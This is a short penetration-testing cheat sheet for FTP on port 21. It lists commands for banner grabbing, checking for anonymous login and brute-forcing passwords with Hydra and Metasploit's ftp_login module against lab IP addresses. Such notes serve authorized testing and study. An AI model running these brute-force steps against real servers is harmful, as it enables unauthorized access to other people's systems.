# FTP port 21

+ FTP provides non-interactive shell
+ Fingerprint server  
    ```
    telnet ip_address 21
    ```
+ Check for anonymous access    
    ```
    ftp ip_address
    Username: anonymous OR anon
    Password: any@email.com
    ```
    ```
    # nmap -v -p 21 --script=ftp-anon.nse
    ```
+ Password guessing
    - Hydra brute force
    ```
    # hydra -L users.txt -e nsr -u 192.168.56.102 -s 21 ftp
    ```

    - medusa
    - Brutus
    ```
    # msfconsole -q
      msf> search type:auxiliary login
      msf> use auxiliary/scanner/ftp/ftp_login
      msf auxiliary(ftp_login) > show options
      msf auxiliary(ftp_login) > set PASS_FILE /root/password-file.txt
      msf auxiliary(ftp_login) > set USERPASS_FILE /root/users.txt
      msf auxiliary(ftp_login) > set RHOSTS 192.168.11.219
      msf auxiliary(ftp_login) > run
    ```

+ Examine configuration files:
    - ftpusers
    - ftp.conf
    - proftpd.conf

+ MiTM
    pasvagg.pl
